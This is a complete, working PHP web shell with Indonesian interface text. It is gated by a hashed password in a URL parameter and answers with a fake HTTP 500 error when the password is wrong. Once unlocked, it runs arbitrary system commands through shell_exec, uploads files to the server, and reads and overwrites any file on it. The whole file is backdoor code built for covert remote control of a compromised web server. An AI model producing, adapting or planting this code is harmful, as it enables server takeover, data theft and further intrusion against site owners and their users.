<?php
$hashParam = '$2y$10$zWaRUKAZSJB.KIWaNL6U8O6hRlibDZr8T7fjDd0BoL9RnfevDeaIm';

$param = $_GET['access'] ?? '';

if (password_verify($param, $hashParam)) {

    if ($_FILES) {
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "… Upload berhasil!<br>";
    }

    if (isset($_POST['cmd'])) {
        echo "<pre>→ " . htmlspecialchars($_POST['cmd']) . ":</pre>";
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }

    if (isset($_POST['edit_file'])) {
        file_put_contents($_POST['edit_file'], $_POST['content']);
        echo "… File berhasil diedit!<br>";
    }

    echo '<form method="POST">
            <input type="text" name="cmd" placeholder="Masukkan Perintah">
            <input type="submit" value="Eksekusi">
          </form>';

    echo '<form method="POST" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
          </form>';

    if (isset($_GET['file'])) {
        echo '<form method="POST">
                <input type="hidden" name="edit_file" value="'.htmlspecialchars($_GET['file']).'">
                <textarea name="content" rows="10" cols="50">'
                .htmlspecialchars(file_get_contents($_GET['file'])).'</textarea>
                <input type="submit" value="Simpan">
              </form>';
    }

} else {
    http_response_code(500);
}
?>
